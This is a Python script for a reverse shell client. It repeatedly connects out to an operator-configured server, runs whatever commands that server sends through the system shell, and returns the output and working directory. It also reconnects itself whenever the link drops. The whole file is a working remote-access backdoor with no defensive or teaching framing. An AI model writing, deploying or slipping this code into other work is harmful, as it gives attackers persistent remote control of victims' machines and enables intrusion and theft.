import socket
import os
import subprocess
import time

def connect_to_server():
    host = "x.x.x.x" #Your server ip
    port = 57408
    while True:
        try:
            s = socket.socket()
            s.connect((host, port))
            print("Connected to server.")
            return s
        except Exception as e:
            print(f"Error connecting to server: {e}. Retrying in 5 seconds...")
            time.sleep(5)

s = connect_to_server()

while True:
    try:
        data = s.recv(1024)
        if not data:
            break  # If no data is received, exit

        cmd = data.decode("utf-8").strip()

        # Change Directory Handling
        if cmd[:2] == 'cd':
            try:
                os.chdir(cmd[3:])  # Change the directory
                result = ""
            except FileNotFoundError:
                result = "Directory not found\n"
        
        elif cmd.lower() == "exit":  # Graceful exit
            break

        else:
            # Run the command using cmd.exe (ensures `dir` and other built-ins work)
            process = subprocess.Popen(
                cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, text=True
            )
            output, error = process.communicate()
            result = output + error

        # Send response back to server
        currentWD = os.getcwd() + "> "
        s.sendall(str.encode(result + "\n" + currentWD))

    except Exception as e:
        s.sendall(str.encode(f"Error: {str(e)}\n"))
        print(f"Error: {str(e)}. Reconnecting...")
        s.close()
        s = connect_to_server()  # Reconnect to the server if an error occurs
